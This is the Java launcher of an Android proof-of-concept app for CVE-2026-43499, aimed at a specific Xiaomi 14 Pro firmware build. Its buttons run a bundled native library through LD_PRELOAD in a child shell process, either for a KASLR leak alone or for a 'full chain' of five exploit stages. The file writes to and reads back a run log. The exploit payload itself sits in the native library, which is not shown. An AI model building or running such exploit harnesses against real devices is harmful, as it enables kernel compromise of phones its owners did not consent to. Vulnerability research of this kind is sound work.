package com.dchamp.poc;

import android.app.Activity;
import android.content.pm.ApplicationInfo;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Map;

public class MainActivity extends Activity {
    static final String TAG = "DchampApp";

    private TextView logView;
    private StringBuilder logBuffer = new StringBuilder();
    private String logFilePath;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        ApplicationInfo ai = getApplicationInfo();
        String libDir = ai.nativeLibraryDir;
        File filesDir = getExternalFilesDir(null);
        if (filesDir == null) {
            filesDir = getFilesDir();
        }
        logFilePath = new File(filesDir, "preload-run.log").getAbsolutePath();

        Log.i(TAG, "uid=" + android.os.Process.myUid()
                + " pid=" + android.os.Process.myPid()
                + " nativeLibraryDir=" + libDir
                + " logFile=" + logFilePath);

        File so = new File(libDir, "libpreload.so");
        Log.i(TAG, "libpreload.so exists=" + so.exists()
                + " canRead=" + so.canRead()
                + " len=" + so.length());

        // Build UI
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 32, 32, 32);

        TextView title = new TextView(this);
        title.setText("Dchamp PoC - CVE-2026-43499");
        title.setTextSize(18);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("\nDevice: shennong (Xiaomi 14 Pro)\n"
                + "Build: OS3.0.307.0.WNBCNXM_16.0\n"
                + "libpreload.so: " + (so.exists() ? "OK (" + so.length() + " bytes)" : "MISSING")
                + "\nLog: " + logFilePath);
        info.setTextSize(12);
        root.addView(info);

        // Buttons
        addButton(root, "1. SLIDE_ONLY (KASLR leak only)", "execslide");
        addButton(root, "2. FULL CHAIN (all 5 stages)", "execfull");
        addButton(root, "3. View last run log", "viewlog");
        addButton(root, "4. Clear log", "clearlog");

        logView = new TextView(this);
        logView.setTextSize(10);
        logView.setPadding(0, 24, 0, 0);
        ScrollView sv = new ScrollView(this);
        sv.addView(logView);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1);
        sv.setLayoutParams(lp);
        root.addView(sv);

        setContentView(root);

        appendLog("Ready. Tap a button above to start.\n");

        // Auto-start if mode extra is provided (for command-line testing)
        String autoMode = getIntent().getStringExtra("mode");
        if (autoMode != null && !autoMode.isEmpty()) {
            appendLog("Auto-starting mode=" + autoMode + " (from intent extra)\n");
            if ("viewlog".equals(autoMode)) {
                viewLogFile();
            } else {
                runExploit(autoMode);
            }
        }
    }

    private void addButton(LinearLayout root, String text, final String mode) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setOnClickListener(v -> {
            if ("viewlog".equals(mode)) {
                viewLogFile();
            } else if ("clearlog".equals(mode)) {
                clearLogFile();
            } else {
                runExploit(mode);
            }
        });
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.topMargin = 12;
        btn.setLayoutParams(lp);
        root.addView(btn);
    }

    private void appendLog(String line) {
        logBuffer.append(line);
        if (!line.endsWith("\n")) logBuffer.append("\n");
        runOnUiThread(() -> logView.setText(logBuffer.toString()));
        Log.i(TAG, line.trim());
    }

    private void runExploit(String mode) {
        ApplicationInfo ai = getApplicationInfo();
        String soPath = new File(ai.nativeLibraryDir, "libpreload.so").getAbsolutePath();

        String perfOnly = null;
        String slideOnly = null;
        String modeLabel = mode;

        if ("execslide".equals(mode)) {
            slideOnly = "1";
            modeLabel = "SLIDE_ONLY (KASLR leak)";
        } else if ("execfull".equals(mode)) {
            modeLabel = "FULL CHAIN";
        }

        final String label = modeLabel;
        appendLog("=== Starting " + label + " at " + timestamp() + " ===\n");

        try {
            // Truncate log file for fresh run
            new File(logFilePath).delete();

            ProcessBuilder pb = new ProcessBuilder(
                    "/system/bin/sh", "-c",
                    "echo child-ready pid=$$; exec /system/bin/true");
            Map<String, String> env = pb.environment();
            env.put("LD_PRELOAD", soPath);
            env.put("LOG_FILE", logFilePath);
            if (perfOnly != null) env.put("PERF_ONLY", perfOnly);
            if (slideOnly != null) env.put("SLIDE_ONLY", slideOnly);
            pb.redirectErrorStream(true);

            Process p = pb.start();
            appendLog("child started LD_PRELOAD=" + soPath
                    + " SLIDE_ONLY=" + slideOnly
                    + " LOG_FILE=" + logFilePath);

            final Process proc = p;
            Thread t = new Thread(() -> {
                try {
                    BufferedReader r = new BufferedReader(
                            new InputStreamReader(proc.getInputStream()));
                    String line;
                    while ((line = r.readLine()) != null) {
                        appendLog("child| " + line);
                    }
                    int rc = proc.waitFor();
                    appendLog("--- child exited rc=" + rc + " ---\n");
                } catch (Exception e) {
                    appendLog("child reader error: " + e);
                }
            }, "child-out");
            t.setDaemon(true);
            t.start();
        } catch (Exception e) {
            appendLog("exec failed: " + e);
            Log.e(TAG, "exec failed", e);
        }
    }

    private void viewLogFile() {
        appendLog("=== Reading log file: " + logFilePath + " ===\n");
        new Thread(() -> {
            try {
                File f = new File(logFilePath);
                if (!f.exists()) {
                    appendLog("(log file does not exist yet)\n");
                    return;
                }
                BufferedReader r = new BufferedReader(
                        new InputStreamReader(new FileInputStream(f)));
                String line;
                int count = 0;
                StringBuilder sb = new StringBuilder();
                while ((line = r.readLine()) != null) {
                    sb.append(line).append("\n");
                    count++;
                    if (count > 500) {
                        sb.append("... (truncated, first 500 lines)\n");
                        break;
                    }
                }
                r.close();
                final String content = sb.toString();
                runOnUiThread(() -> {
                    logBuffer.setLength(0);
                    logBuffer.append(content);
                    logView.setText(logBuffer.toString());
                });
            } catch (Exception e) {
                appendLog("read log error: " + e);
            }
        }).start();
    }

    private void clearLogFile() {
        new File(logFilePath).delete();
        logBuffer.setLength(0);
        logView.setText("");
        appendLog("Log cleared.\n");
    }

    private static String timestamp() {
        return new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
    }
}
